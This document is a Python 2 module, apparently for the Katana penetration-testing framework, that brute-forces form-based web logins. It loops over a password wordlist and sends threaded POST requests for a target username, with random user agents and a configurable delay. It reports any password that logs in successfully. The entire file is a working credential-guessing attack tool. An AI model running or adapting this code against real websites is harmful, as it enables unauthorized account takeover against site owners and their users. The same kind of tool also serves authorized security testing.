# This module requires katana framework 
# https://github.com/PowerScript/KatanaFramework

# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core import                  #
from core.KatanaFramework import *    #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #

# LIBRARIES  
import httplib,urllib,threading,time
# END LIBRARIES 

# INFORMATION MODULE
def init():
	init.Author             ="RedToor"
	init.Version            ="1.3"
	init.Description        ="Brute Force to Form-based in Webs application."
	init.CodeName           ="web/bt.form"
	init.DateCreation       ="28/02/2015"      
	init.LastModification   ="25/12/2016"
	init.References         =None
	init.License            =KTF_LINCENSE
	init.var                ={}

	# DEFAULT OPTIONS MODULE
	init.options = {
		# NAME    VALUE                RQ     DESCRIPTION
		'target':[LOCAL_IP            ,True ,'Host Target'],
		'port'  :[HTTP_PORT           ,False,'Port Target'],
		'file'  :["/login.php"        ,True ,'File request'],
		'user'  :[USERNAME            ,True ,'Username target'],
		'dict'  :["files/db/pass.dicc",False,'Wordlist'],
		'data_a':["username"          ,True ,'Name value 1'],
		'data_b':["password"          ,True ,'Name value 2'],
		'method':["POST"              ,True ,'Method form'],
		'alert' :["NO"                ,True ,'error login']
	}

	# EXTRA OPTIONS MODULE
	init.extra = {
		# NAME    VALUE                RQ     DESCRIPTION
		'sleep'  :["0"               ,False,'Time of sleep'],
		'threads':["0"               ,False,'Number\'s threads']
	}
	return init
# CODE MODULE    ############################################################################################
def main(run):

	NET.CheckConnectionHost(init.var['target'],init.var['port'],5)
	Loadingfile(init.var['dict'])

	PASSWORDS_REC = []
	global STATE
	STATE=False

	with open(init.var['dict'],'r') as passwords:
		for password in passwords:
			password=password.replace("\n","")
			PASSWORDS_REC.append(password)

			if int(init.var['threads']) == 0:
				if request_thread(password):return

			if len(PASSWORDS_REC) > int(init.var['threads']) and int(init.var['threads']) != 0:
				for test_password in PASSWORDS_REC:
					if STATE:return
					t = threading.Thread(target=request_thread,args=(test_password,))
					t.start()
				time.sleep(int(init.var['sleep']))
				PASSWORDS_REC = []

def request_thread(password):
	#@password : Password for Test in Service.

	global STATE
	params = urllib.urlencode({init.var['data_a']: init.var['user'], init.var['data_b']: password})
	header={"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain" , "User-agent" : WEB.RamdonAgent()}
	conn = httplib.HTTPConnection(init.var['target'],init.var['port'])
	conn.request(init.var['method'], init.var['file'], params, header)
	response = conn.getresponse()
	ver_source = response.read()

	if ver_source.find(init.var['alert']) != 0 and response.status == 200:
		printk.suff("Successfully with ["+init.var['data_a']+"="+init.var['user']+"]["+init.var['data_b']+"="+password+"]\n")
		UTIL.sRegister(init,password)
		STATE = True
		return True
	else:
		if STATE==False:printk.inf(" | Checking '"+password+"'")

# END CODE MODULE ############################################################################################
